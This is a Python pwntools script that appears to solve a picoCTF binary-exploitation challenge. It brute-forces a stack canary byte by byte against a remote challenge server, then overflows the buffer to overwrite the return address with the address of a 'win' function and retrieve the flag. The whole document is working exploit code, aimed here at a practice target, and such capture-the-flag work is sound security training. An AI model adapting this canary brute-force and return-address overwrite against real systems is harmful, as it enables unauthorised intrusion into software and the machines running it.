from pwn import *
import string

offset1 = b"a" * 64 # buf
canary = b"" # canary
offset2 = b"a" * 16 # offset to eip
eip = p32(0x08049336) # address of win function


# find canary
for i in range(1, 5):
    for c in string.printable:
        r = remote("saturn.picoctf.net", 58405)
        r.recvuntil('>')
        r.sendline(str(64+i).encode()) # size the we want to input
        r.recvuntil('>')
        r.sendline(offset1 + canary + c.encode()) # try to add 1 more character
        output = r.recvall().decode()
        if 'Flag' in output: # if the char c is corret canary
            canary += c.encode()
            break
    print(canary)
    
# send the payload and obtain the flag
r = remote("saturn.picoctf.net", 58405)
r.recvuntil('>')
r.sendline(str(64+4+16+4).encode())
r.recvuntil('>')
r.sendline(offset1+canary+offset2+eip)
r.interactive()